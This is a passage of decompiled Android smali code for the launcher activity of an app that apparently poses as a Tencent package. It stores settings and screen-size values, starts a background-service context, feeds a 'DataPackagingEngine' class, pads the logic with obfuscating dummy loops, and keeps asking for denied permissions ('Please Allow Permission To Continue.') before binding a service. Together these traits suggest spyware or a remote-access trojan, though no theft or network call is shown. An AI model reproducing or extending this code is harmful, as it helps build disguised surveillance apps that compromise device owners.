    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v5, v3, v4}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const-string v6, "NO"

    if-nez v5, :cond_0

    .line 317
    :try_start_1
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v5, v3, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 319
    :cond_0
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v2, v4}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    if-nez v3, :cond_1

    .line 320
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3, v2, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 322
    :cond_1
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2, v1, v4}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-nez v2, :cond_2

    .line 323
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2, v1, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 325
    :cond_2
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1, v0, v4}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_3

    .line 326
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1, v0, v6}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 329
    :cond_3
    new-instance v0, Landroid/graphics/Point;

    invoke-direct {v0}, Landroid/graphics/Point;-><init>()V

    .line 330
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v1

    invoke-interface {v1}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    .line 333
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "SCH"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v5, v0, Landroid/graphics/Point;->x:I

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v2, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 334
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "SCW"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v0, v0, Landroid/graphics/Point;->y:I

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v2, v0}, Lcom/tencent/My_tunesxconcerningn10_Settings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 338
    :try_start_2
    new-instance v0, Lcom/tencent/MainLauncherActivity$MyExceptionHandler;

    const-class v1, Lcom/tencent/MainLauncherActivity;

    invoke-direct {v0, p0, p0, v1}, Lcom/tencent/MainLauncherActivity$MyExceptionHandler;-><init>(Lcom/tencent/MainLauncherActivity;Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {v0}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V

    .line 340
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_4

    .line 343
    :catch_0
    :try_start_3
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    .line 344
    :goto_0
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const/4 v1, 0x0

    if-eqz v0, :cond_4

    .line 350
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_0

    .line 359
    :cond_4
    :goto_1
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_5

    .line 365
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_1

    .line 374
    :cond_5
    :goto_2
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_6

    .line 380
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_2

    .line 389
    :cond_6
    :goto_3
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_7

    .line 395
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_3

    .line 406
    :cond_7
    :goto_4
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const v0, 0x7f090012

    invoke-virtual {p1, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/tencent/DataPackagingEngine;->p_tunesxconcerningn103_r:Ljava/lang/String;

    .line 408
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    .line 409
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    .line 410
    new-instance v1, Lcom/tencent/MainLauncherActivity$1;

    invoke-direct {v1, p0, p1}, Lcom/tencent/MainLauncherActivity$1;-><init>(Lcom/tencent/MainLauncherActivity;Landroid/content/Context;)V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 0

    .line 654
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x22b

    if-eq p1, p2, :cond_0

    goto :goto_0

    .line 658
    :cond_0
    array-length p1, p3

    const/4 p2, 0x0

    if-lez p1, :cond_1

    aget p1, p3, p2

    if-nez p1, :cond_1

    .line 661
    invoke-virtual {p0}, Lcom/tencent/MainLauncherActivity;->Check_tunesxconcerningn109_Bind()V

    goto :goto_0

    :cond_1
    const-string p1, "Please Allow Permission To Continue."

    .line 666
    invoke-static {p0, p1, p2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 668
    iget-object p1, p0, Lcom/tencent/MainLauncherActivity;->StoragPermissions:[Ljava/lang/String;

    iget p2, p0, Lcom/tencent/MainLauncherActivity;->PERMISSION_ALL:I

    invoke-static {p0, p1, p2}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :goto_0
    return-void
.end method
